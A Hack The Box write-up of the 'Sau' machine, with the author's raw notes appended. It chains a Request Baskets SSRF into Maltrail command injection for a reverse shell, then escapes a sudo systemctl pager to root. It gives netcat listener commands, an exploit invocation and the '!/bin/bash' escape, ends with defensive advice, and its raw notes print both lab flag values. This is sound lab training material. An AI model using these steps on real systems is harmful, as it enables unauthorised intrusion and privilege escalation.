# HTB Writeup — Sau (10.10.11.224)

**Difficulty:** Easy  
**Target:** Linux — Request Baskets & Maltrail chaining → puma (user) → root  
**IP:** `10.10.11.224`  
**Author:** [your name / handle]  
**Date:** 2025-10-17

---

## TL;DR (one-line)
Chained SSRF in *Request Baskets* (CVE-2023-27163) → reach internal Maltrail v0.53 → unauthenticated command injection → reverse shell as `puma` → sudo/systemd pager escape → `root`.

**Flags recovered**
- **User:** `[REDACTED]`  
- **Root:** `[REDACTED]`

---

## 1) Recon / Enumeration

**Scans used:** `nmap/zenmap`, `rustscan` (plus manual browser inspection)

**Open services discovered**
```
22/tcp   open   ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp   filtered http
55555/tcp open  http   Golang net/http server (Request Baskets)
```

Rustscan fingerprint revealed SSH host keys and a web service on port `55555`. Nmap shows the HTTP service identifies as **Request Baskets** (http-title).

Visiting `http://10.10.11.224:55555/` shows a small web app that lets you create “baskets” (named containers that collect HTTP requests). The UI allows setting a *forward_url* and proxy-related options — a weaponizable SSRF vector.

---

## 2) Target behavior / important app features

**Request Baskets** features relevant to exploitation:

- Create a named basket (e.g. `p5naosm`) and receive a token.
- The basket provides a public URL that you can send requests to; the service captures those requests.
- There is a *forward_url* option: the basket can forward incoming requests to an arbitrary URL (used as a simple proxy).
- Config flags include **Proxy Response** (return the proxied response to the client) and **Expand Forward Path** (append original path to forward URL).
- The source repo mentions **CVE-2023-27163 — SSRF** (server-side request forgery) affecting the project.

These features allow you to make the app connect to arbitrary internal addresses (127.0.0.1) from the target.

---

## 3) Proof-of-concept: Confirming SSRF/proxying

**Create basket and set forward_url to attacker**
- Create basket via web UI → got token and basket name `p5naosm`.
- Set `forward_url` to `http://10.10.14.9:80` (attacker listener); enable **Proxy Response** / **Expand Forward Path** as needed.

**On attacker:**
```bash
nc -lnvp 80
```

**Result (example output)**
```
listening on [any] 80 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.224] 48704
GET / HTTP/1.1
Host: 10.10.14.9
User-Agent: ...
X-Do-Not-Forward: 1
```

This proves the basket will open outbound connections to the configured *forward_url* and forward the client request — SSRF confirmed.

---

## 4) Pivot: reach internal Maltrail UI

**Action**
- Set `forward_url` to `http://127.0.0.1:80`
- Enable **Proxy Response** and **Expand Forward Path**

**Observation**
- Visiting the basket URL now returned content from an internal service: **Maltrail v0.53** (an internal monitoring web UI).

This confirms we can use the SSRF/proxy to reach services bound to localhost on the target.

---

## 5) Exploit Maltrail → RCE (unauthenticated command injection)

Maltrail v0.53 is known to have an unauthenticated OS command injection (public exploit). Instead of brute-forcing, use a public exploit adapted to the SSRF forward URL.

**Exploit execution (example used)**
```bash
# On attacker: listen for reverse shell
nc -lnvp 4444

# On attacker: run provided exploit script (points Maltrail to our listener via SSRF)
python3 exploit.py 10.10.14.9 4444 http://10.10.11.224:55555/p5naosm
```

**Result**
```
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.224] 48704
# shell prompt
whoami
puma
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
```

You now have an interactive shell as `puma`.

---

## 6) Post-exploitation — stabilize shell

Received shell from web exploit may be limited. Recommended upgrade to fully interactive TTY:

```bash
# on attacker after getting a basic shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or the script trick:
script /dev/null -c bash
# then Ctrl+Z, stty -raw echo; fg, press Enter twice
```

Now you should have job control and a usable prompt for enumeration.

---

## 7) Privilege escalation — abusing sudo/systemctl pager (CVE chaining)

**Check sudo rights:**
```bash
sudo -l
```

**Output excerpt**
```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

This allows `puma` to run `systemctl status trail.service` as root without a password.

**Systemd version**
```bash
systemctl --version
# systemd 245 (245.4-4ubuntu3.22)
```

**Why this is exploitable**
- On systemd versions prior to `247`, `systemctl status` may invoke a pager (less) without setting `LESSSECURE=1`.
- `less` supports shell escapes (e.g., `!sh`) which spawn a shell. If `less` runs as root, shell escapes spawn root shells.
- Because `sudo` allows running `systemctl status trail.service` as root (NOPASSWD), invoking that command leads to root-owned `less`, which can be escaped to run commands as root.

**Exploit flow (conceptual)**
1. `sudo /usr/bin/systemctl status trail.service`
2. When output opens in `less`, trigger a shell escape: in `less` type `!/bin/bash` (or `!sh`).
3. The spawned shell runs as root → `root` shell obtained.

**Result**
- After executing the pager-escape, you become root and can read root flag:
```
cat /root/root.txt
# [REDACTED]
```

**User flag**
```
cat /home/puma/.../user.txt
# [REDACTED]
```

---

## 8) Why this chain works (brief analysis)

- **CVE-2023-27163 (Request Baskets SSRF)**: The app allows forwarding/ proxying to arbitrary URIs, enabling SSRF to host-local services.
- **Maltrail v0.53 RCE**: Maltrail’s web UI had unauthenticated command injection allowing remote command execution; combined with SSRF, it becomes reachable and exploitable from attacker.
- **sudo/systemctl misconfiguration**: Sudoers entry grants NOPASSWD execution of a root command that uses a pager (less) not hardened in older systemd; less shell escapes are leveraged to spawn a root shell.

---

## 9) Reproducible commands (concise)

**Create basket & prove forwarding**
```bash
# create basket via UI, set forward_url to attacker's listener
nc -lnvp 80
# visit basket URL -> see GET requests arrive
```

**Maltrail exploit (example)**
```bash
# listen
nc -lnvp 4444

# run exploit script pointing at SSRF endpoint
python3 exploit.py 10.10.14.9 4444 http://10.10.11.224:55555/p5naosm
```

**Stabilize shell**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or script trick:
script /dev/null -c bash
# Ctrl+Z
stty -raw echo; fg
# press Enter twice
```

**Privilege escalation**
```bash
sudo -l
sudo /usr/bin/systemctl status trail.service
# when pager opens, enter:
!/bin/bash
# now root
id
cat /root/root.txt
```

---

## 10) Defensive recommendations

**Fix SSRF risk**
- Validate and restrict allowed `forward_url` values; disallow arbitrary internal addresses (127.0.0.1, 169.254.*.*, etc.).
- Disable user-controlled proxying or require strict allowlists.
- Set reasonable default timeouts and request limits.

**Fix Maltrail**
- Upgrade Maltrail to a fixed version; patch or remove vulnerable endpoints.
- Ensure web UIs that accept external input escape/sanitize shell-sensitive fields.

**Fix systemd/sudo issue**
- Remove risky sudoers entries allowing systemctl or other paged outputs with NOPASSWD.
- Update systemd to ≥247 where fixes for LESSSECURE handling were applied.
- Set `LESSSECURE=1` for env when calling pagers or use `--no-pager`/`--no-ask-password` variants when possible.
- Audit sudoers for NOPASSWD entries and limit commands to absolute minimum.

---

## 11) Lessons learned

- SSRF is a powerful pivot; features that proxy/forward requests are high-value attack surfaces.
- Local-only services (127.0.0.1) should be considered sensitive and not reachable via user-configurable forwarding.
- Chaining low-to-medium vulnerabilities can yield full compromise without needing complex zero-days.
- Sudo configs and system utilities (pagers) should be carefully considered when delegating root commands.

---

*End of writeup*

---
originial notes:
<details>
Sau


  `Sau` is an Easy Difficulty Linux machine that features a  `Request 
 Baskets` instance that is vulnerable to Server-Side Request Forgery 
 (SSRF) via  
 `[CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)`. 
 Leveraging the vulnerability we are to gain access to a `Maltrail` 
 instance that is vulnerable to Unauthenticated OS Command Injection, 
 which allows us to gain a reverse shell on the machine as `puma`. A 
 `sudo` misconfiguration is then exploited to gain a `root` shell. 


ip = 10.10.11.224

starter scans, zenmap, nmpa, rustscan
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     http    Golang net/http server

OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)

rustscan details also include some keys, lsited below:

22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdY38bkvujLwIK0QnFT+VOKT9zjKiPbyHpE+cVhus9r/6I/uqPzLylknIEjMYOVbFbVd8rTGzbmXKJBdRK61WioiPlKjbqvhO/YTnlkIRXm4jxQgs+xB0l9WkQ0CdHoo/Xe3v7TBije+lqjQ2tvhUY1LH8qBmPIywCbUvyvAGvK92wQpk6CIuHnz6IIIvuZdSklB02JzQGlJgeV54kWySeUKa9RoyapbIqruBqB13esE2/5VWyav0Oq5POjQWOWeiXA6yhIlJjl7NzTp/SFNGHVhkUMSVdA7rQJf10XCafS84IMv55DPSZxwVzt8TLsh2ULTpX8FELRVESVBMxV5rMWLplIA5ScIEnEMUR9HImFVH1dzK+E8W20zZp+toLBO1Nz4/Q/9yLhJ4Et+jcjTdI1LMVeo3VZw3Tp7KHTPsIRnr8ml+3O86e0PK+qsFASDNgb3yU61FEDfA0GwPDa5QxLdknId0bsJeHdbmVUW3zax8EvR+pIraJfuibIEQxZyM=
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEFMztyG0X2EUodqQ3reKn1PJNniZ4nfvqlM7XLxvF1OIzOphb7VEz4SCG6nXXNACQafGd6dIM/1Z8tp662Stbk=
|   256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICYYQRfQHc6ZlP/emxzvwNILdPPElXTjMCOGH6iejfmi
55555/tcp open  http    syn-ack ttl 63 Golang net/http server
| http-methods: 
|_  Supported Methods: GET OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Fri, 17 Oct 2025 09:59:24 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Fri, 17 Oct 2025 09:59:08 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Fri, 17 Oct 2025 09:59:09 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
| http-title: Request Baskets
|_Requested resource was /web
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.95%I=7%D=10/17%Time=68F2136E%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;
SF:\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2017\x20Oct\x2
SF:02025\x2009:59:08\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/
SF:web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x20
SF:200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2017\x20Oct\x2
SF:02025\x2009:59:09\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain
SF:;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request
SF:")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
SF:\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-C
SF:ontent-Type-Options:\x20nosniff\r\nDate:\x20Fri,\x2017\x20Oct\x202025\x
SF:2009:59:24\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20
SF:name;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\
SF:\-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeSca
SF:n,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Hos
SF:t\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20H
SF:ost\x20header");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/17%OT=22%CT=%CU=40932%PV=Y%DS=2%DC=T%G=N%TM=68F2138
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 13.722 days (since Fri Oct  3 12:40:30 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   54.83 ms 10.10.14.1
2   48.60 ms 10.10.11.224

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 05:59
Completed NSE at 05:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 05:59
Completed NSE at 05:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 05:59
Completed NSE at 05:59, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.63 seconds
           Raw packets sent: 34 (2.306KB) | Rcvd: 24 (1.718KB)

http://10.10.11.224:55555/ gets us to a site where we can create a basket to collect and inspect http requests

creating a basket gives us:

Created
        
        Basket 'p5naosm' is successfully created!
Your token is: MqvguNqgyC21uuZXvgIYyKgQNlgpTuK-vucCbW0QBDRO

we open the basket and get:

                  
Basket: p5naosm
              
              
Requests: 0 (0)
      
    
            
                  
Empty basket!
      This basket is empty, send requests to http://10.10.11.224:55555/p5naosm          and they will appear here.
    
  

we can try to give it a master token and gain access to all baskets, looks promising

looking at the page source we see a github link that tells us this software is open source, uses sql, and install/config data

it looks like some of the notes/comments/issues show a CVE titled 
CVE-2023-27163
Server-Side Request Forgery (SSRF)

under the sites own config settings we see options like forward url, insecure TLS (Which was disable certifications), proxy response and expand forward path, as well as basket capacity

there are numerous ways to utlize this cve, I am currently figuring some out, links on another github about a docker box to get he vuln, i'll keep digging

just noticed under the gear/options we can set the forward address, let's put that as our pc

we then used nc -lnvp 80 and sent a request by going to http://10.10.11.224:55555/p5naosm

└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.224] 48704
GET / HTTP/1.1
Host: 10.10.14.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Priority: u=0, i
Upgrade-Insecure-Requests: 1
X-Do-Not-Forward: 1

 edit our proxy configuration again
and set the forwarding URL to http://127.0.0.1:80 . We also enable the following settings:
Proxy Response - This allows the basket to behave as a full proxy: responses from the underlying
service configured in forward_url are passed back to clients of original requests. The
configuration of basket responses is ignored in this case.
Expand Forward Path - With this, the forward URL path will be expanded when original HTTP
request contains a compound path.

when we do this we see a Maltrail v0.53 page

if we google Maltrail (v0.53) we find exploits, such as 
Weaponized Exploit for Maltrail v0.53 Unauthenticated OS Command Injection (RCE)

listening on [any] 80 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.224] 48704
GET / HTTP/1.1
Host: 10.10.14.9
User-Agent: ...
X-Do-Not-Forward: 1

What the nc output means (line-by-line)
connect to [10.10.14.9] from ... [10.10.11.224]: the basket (10.10.11.224) opened a TCP connection to your listener (10.10.14.9:80). That proves the basket can make outbound HTTP connections to the address you configured as the forward address.

GET / HTTP/1.1 and the headers: that is the HTTP request the basket sent to your listener. The Host: header shows the host header it used (10.10.14.9 = your listener).

So basket forwarded the incoming client request to whatever forward URL you set, and you saw that forwarded request on your listener.

X-Do-Not-Forward: 1 — a custom header the basket added (probably to avoid forwarding certain internal requests or loops). It isn’t important for the basic forwarding idea, but it’s there so you’ll see it.
Why this proves you can reach the target’s internal web UI

Two phases:

Test phase (what you did): You set forward URL to your PC (external IP) and basket forwarded the incoming HTTP request to your PC. That proves the basket will accept an incoming request and forward it to the configured forward URL.

Attack phase (what you want to do): If the basket is running on the target machine, you can change the forward URL to a loopback address on that machine, e.g. http://127.0.0.1:80 (or the port Maltrail uses)

oooo ok, so when we saw that it responsed back to us and looped back, then we should nkow that we can then loop ourselves back to it
that way we can go to places like localhost and their maltrail even when we aren't meant to

When the basket receives an incoming request it will then open a connection to its own localhost and forward the request to the internal service. That gives you a way to reach services that are only bound to 127.0.0.1 on the target (the classic SSRF/forward trick).

In short: you validated the forwarding mechanism by pointing it at your PC; now point it at 127.0.0.1 on the target and the basket will forward requests from your browser to the target's loopback services and return the responses (if configured to do so).

What the two important settings do

Proxy Response — when enabled, the basket will act as a proxy in the full sense: it forwards the request to forward_url, waits for the remote response, and then passes that response back to the original client.
xpand Forward Path — controls how the path is constructed when forwarding. Example:

Forward URL: http://127.0.0.1:80

Incoming client request: GET /p5naosm/some/path

If Expand Forward Path = ON, basket will call http://127.0.0.1:80/p5naosm/some/path (it appends the original path).

If OFF, basket might only forward http://127.0.0.1:80/ (or only a base path) and drop the original path.
This matters because the internal web UI you want may live on a particular path (e.g. /maltrail or /settings), so you usually want path expansion.

so, we did some digging and found a exploit that let us use netcat on port 4444 (the hacker port lol) to get acccess

we downloaed teh exploit and ran the python command
python3 exploit.py 10.10.14.9 4444 http://10.10.11.224:55555/p5naosm 

we set up our port, the listening port, and the url for our basket
it then tried to log in adn then nc gave us a cmd line

getting more info on the machine

$ whoami
whoami

$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)

this to gain a shell as root .
script /dev/null -c bash
# Ctrl + z
stty -raw echo; fg
# Enter (Return) x2

When you catch a shell from a web app or reverse connection it's often a minimal, non-interactive shell (no job control, broken line-editing, no Ctrl+C handling, no arrow keys, etc.). The sequence you posted upgrades that session to a proper interactive TTY.

Commands and what they do:

script /dev/null -c bash

script opens a pseudo-tty and runs the command given by -c (here bash). The new bash runs attached to a real PTY, so things like job control, arrow keys, and tab completion start working better. Output is written to /dev/null so no logfile is kept.

# Ctrl+Z

Suspends (backgrounds) the script job and drops you back to the original shell prompt. You do this because you need to tweak the controlling terminal settings from the parent shell before resuming the PTY-backed bash.

stty -raw echo; fg

stty -raw echo fixes the parent's terminal modes so that the foreground job will behave normally (turns off raw mode and enables echo).

fg brings the suspended script job (the PTY-backed bash) back to the foreground.

# Enter (Return) x2

Pressing Enter once or twice usually forces the resumed bash to refresh and give you a prompt. After that, you should have a much more usable interactive shell (proper line editing, job control, Ctrl+C, arrow keys, etc.).

puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

going to the puma dir we find the the flag of: b19f1eebf68037fd569c8aaf9dfb0d30

so we know with sudo -l we can run some root stuff, broken down we see:
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

means: the user puma is allowed to run the exact command /usr/bin/systemctl status trail.service as any user (including root) without being prompted for a password.

Key pieces:

    (ALL : ALL) — you can run that command as any target user/group (so you can run it as root).

    NOPASSWD: — you do not need to supply a password when using sudo for that command.

    /usr/bin/systemctl status trail.service — this is the exact command allowed (including the path and the arguments status trail.service).
	
	looking for more vuln, we try and see what vuln are linked to systemctl
	
	we ask the verison adn find:
	$ systemctl --version
systemctl --version
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid

under sudo -l we saw we can could do anything under the ststemctl, so we requested a bash sehll with !/bin/bash,

that gave us full access and now oure sudo -l says ALL : ALL ALL

then cding and cating at root gave us the last key
b46e1a8fb8e2f84c172066ac43581287

Short answer: it worked because (1) the system is running a vulnerable systemd (≤246) that doesn’t set LESSSECURE=1 when invoking the pager, and (2) the sudoers entry lets your user run systemctl status … as root — systemctl shows output in less, less still allows shell escapes (!…), and that escape runs as root, giving you a root shell
Why the exploit works (step-by-step)

Systemd version is old (before 247). The vulnerability (CVE-2023-26604) affects systemd versions prior to 247

systemctl status uses a pager (less) for long output. When you run systemctl status <service> and the output is longer than the terminal, systemctl displays it through a pager (commonly less). In the vulnerable versions, systemd did not set the LESSSECURE environment variable to disable less’s ability to spawn external programs

less allows shell escapes. less supports commands like !sh or !/path/to/program to suspend the pager and run a user-specified program. If less runs as root, those spawned programs run as root. Because systemd launched the pager as part of the root systemctl process (via sudo), the pager runs with root privileges and so do the spawned programs.

sudoers misconfiguration gives you the exact systemctl status privilege. sudo -l showed NOPASSWD: /usr/bin/systemctl status trail.service. That means you can run that systemctl status command as root without a password

i ran systemctl --version (or checked /proc/1/comm / ps etc.) and saw systemd 245, which is in the vulnerable range.

LESSSECURE=1 tells less to disable “dangerous” features (like ! shell escapes). The vulnerable systemd versions failed to enforce that when launching the pager in certain sudo contexts; the fix sets an appropriate environment (or otherwise prevents these escapes) in systemd ≥247

so this worked do to the info page, basically the lesser cmd, not being secured and allwoing us to escape
since we are sudo in this program we can then find a broken area, like lesser, and get out, nice!

</details>
